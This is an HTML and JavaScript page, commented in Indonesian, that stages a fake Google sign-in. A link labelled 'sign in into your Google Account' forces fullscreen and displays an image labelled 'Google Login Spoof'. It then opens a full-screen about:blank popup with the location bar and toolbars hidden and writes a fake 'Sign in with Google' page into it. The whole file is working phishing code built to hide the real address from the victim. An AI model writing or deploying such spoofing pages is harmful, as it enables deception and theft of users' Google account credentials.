<!DOCTYPE HTML>
<html lang="en-US">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no">
    <title>URL TESTING WEBVIEW</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100vh;
            width: 100vw;
            overflow: hidden;
            background: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        #spoof-img {
            display: none;
            max-width: 100%;
            max-height: 100%;
            object-fit: contain;
            position: absolute;
            top: 0;
            left: 0;
            z-index: 1;
        }
        .signin-link {
            padding: 20px 40px;
            background: #4285f4;
            color: white;
            font-size: 18px;
            text-decoration: none;
            border-radius: 4px;
            cursor: pointer;
            z-index: 10;
            position: relative;
        }
    </style>
    <script>
        // Fullscreen untuk window tertentu
        function requestFullscreen(element) {
            if (element.requestFullscreen) return element.requestFullscreen();
            if (element.webkitRequestFullscreen) return element.webkitRequestFullscreen();
            if (element.mozRequestFullScreen) return element.mozRequestFullScreen();
            if (element.msRequestFullscreen) return element.msRequestFullscreen();
        }

        function openWin() {
            // 1. Langsung coba fullscreen di MAIN WINDOW (ini yang paling penting)
            requestFullscreen(document.documentElement);

            // 2. Tampilkan spoof.png di main window
            document.getElementById('spoof-img').style.display = 'block';

            // 3. Sembunyikan tombol setelah 1 detik
            setTimeout(function() {
                document.querySelector('.signin-link').style.display = 'none';
            }, 1000);

            // 4. Buka popup sebagai about:blank (address bar kosong)
            var params = 'width=' + screen.width +
                         ',height=' + screen.height +
                         ',top=0,left=0' +
                         ',menubar=no,toolbar=no,location=no,status=no,scrollbars=no,resizable=no';

            var popup = window.open("about:blank", "google_signin", params);

            if (popup) {
                popup.moveTo(0, 0);
                popup.resizeTo(screen.width, screen.height);

                // Tulis konten popup dengan sign.png
                popup.document.write(`
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <style>
        body, html { margin:0; padding:0; height:100%; width:100%; background:#fff; display:flex; justify-content:center; align-items:center; overflow:hidden; }
        img { max-width:100%; max-height:100%; object-fit:contain; }
    </style>
</head>
<body>
    <img src="sign.png" alt="Sign in with Google">
    <script>
        // Coba fullscreen di popup (opsional, sebagai cadangan)
        function tryFS() {
            var el = document.documentElement;
            if (el.requestFullscreen) el.requestFullscreen();
            else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
            else if (el.mozRequestFullScreen) el.mozRequestFullScreen();
            else if (el.msRequestFullscreen) el.msRequestFullscreen();
        }
        window.onload = tryFS;
    <\/script>
</body>
</html>
                `);
                popup.document.close();
                popup.focus();
            }
        }
    </script>
</head>
<body>
    <a href="#" class="signin-link" onclick="openWin(); return false;">
        Click here to sign in into your Google Account v2
    </a>

    <img id="spoof-img" src="spoof.png" alt="Google Login Spoof">
</body>
</html>
